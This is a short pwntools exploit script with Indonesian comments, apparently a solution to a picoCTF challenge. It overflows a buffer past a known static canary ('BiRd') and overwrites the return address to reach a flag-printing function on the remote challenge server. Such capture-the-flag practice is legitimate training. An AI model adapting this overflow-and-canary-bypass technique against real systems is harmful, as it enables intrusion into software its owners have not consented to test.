from pwn import *

# Target eksekusi (lokal)
# p = process('./vuln')

p = remote('saturn.picoctf.net', 56976)

# --- FASE 3: SUSUN PAYLOAD ---
# Program memiliki validasi tambahan berupa pengecekan nilai dari argument
# Berdasarkan aturan calling convention 

panjang_input = b'88\n'

# payload = b"A" * 112 + p32(0x8049296) + b"AAAA" + p32(0xCAFEF00D) + p32(0xF00DF00D)
payload = b'A' * 64 + b'BiRd' + b'A' * 16 + p32(0x08049336) # (Gabungan dari sampah, canary yang sudah ditemukan, dan tebakan saat ini)
# payload = b'A' * 64 + b'hais' + b'A' * 16 + p32(0x08049336) # (Gabungan dari sampah, canary yang sudah ditemukan, dan tebakan saat ini)



# Mengirim panjang input
p.recvuntil(b"How Many Bytes will You Write Into the Buffer?\n> ")
p.send(panjang_input)
        

# --- FASE 4: TEMBAK ---
# Tunggu sampai program memunculkan teks permintaan input
p.recvuntil(b"Input> ")
p.send(payload)

# Ambil alih interaksi untuk melihat output (flag)
p.interactive()